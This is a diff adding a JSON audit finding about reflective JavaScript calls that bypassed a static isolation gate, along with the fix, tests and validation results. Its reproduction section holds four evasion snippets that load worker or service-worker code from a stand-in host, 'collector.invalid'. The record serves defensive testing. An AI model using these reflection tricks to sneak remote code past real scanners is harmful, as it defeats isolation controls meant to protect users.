@@ -1,0 +1,36 @@
+{
+  "findingId": "SEC-37-083",
+  "severity": "medium",
+  "title": "Reflective worker API access bypassed the registry isolation gate",
+  "status": "fixed_locally",
+  "date": "2026-10-21",
+  "reproduction": {
+    "examples": [
+      "Reflect.construct(Reflect.get(window, 'Worker'), ['https://collector.invalid/worker.js']);",
+      "Reflect.apply(Reflect.get(navigator.serviceWorker, 'register'), navigator.serviceWorker, ['https://collector.invalid/service-worker.js']);",
+      "const apply = Reflect.apply; apply(importScripts, self, ['https://collector.invalid/worker.js']);",
+      "const get = Reflect.get; const makeWorker = get(window, 'SharedWorker'); new makeWorker('https://collector.invalid/shared.js');"
+    ],
+    "beforeFix": "A reflected Worker constructor lookup followed by Reflect.construct returned pass. The regression also covers related reflected service-worker and importScripts forms, including an alias of Reflect.apply.",
+    "afterFix": "Reflected property lookup, descriptor-value lookup, Reflect.apply, and Reflect.construct paths are resolved and blocked when they expose worker-loading APIs."
+  },
+  "rootCause": "Worker checks followed direct and variable aliases but did not resolve capabilities obtained through Reflect.get/Object.getOwnPropertyDescriptor or invoked through Reflect.apply/Reflect.construct.",
+  "affectedFiles": [
+    "packages/registry-gate/src/checks/isolation-check.ts",
+    "packages/registry-gate/src/__tests__/registry-gate.test.ts"
+  ],
+  "remediation": "Resolve statically named reflected property accesses and aliases to worker constructors, service-worker registration, and importScripts; inspect reflected calls without executing submitted source.",
+  "validation": {
+    "redBeforeFix": "pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t \"reflected worker and service-worker code loading\"",
+    "redBeforeFixResult": "failed as expected: the reflected Worker constructor lookup returned pass",
+    "targetedAfterFix": "pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t \"reflected worker and service-worker code loading\"",
+    "registryGateTests": "52 passed",
+    "fullUnitSuite": "1,177 tests passed across 76 files",
+    "typecheck": "22 workspace packages passed",
+    "lint": "0 errors and 33 warnings",
+    "releaseAudit": "16/16 behavioral gates, production builds, bundle budgets, provenance/security audits, and dependency audit passed",
+    "canonicalResourceIsolationMatrix": "324 resources scanned; zero security-isolation failures",
+    "untrustedCodeExecuted": false
+  },
+  "runtimeBoundary": "This is local static source-gate evidence. It does not replace deployed preview sandbox, CSP, or gateway verification."
+}
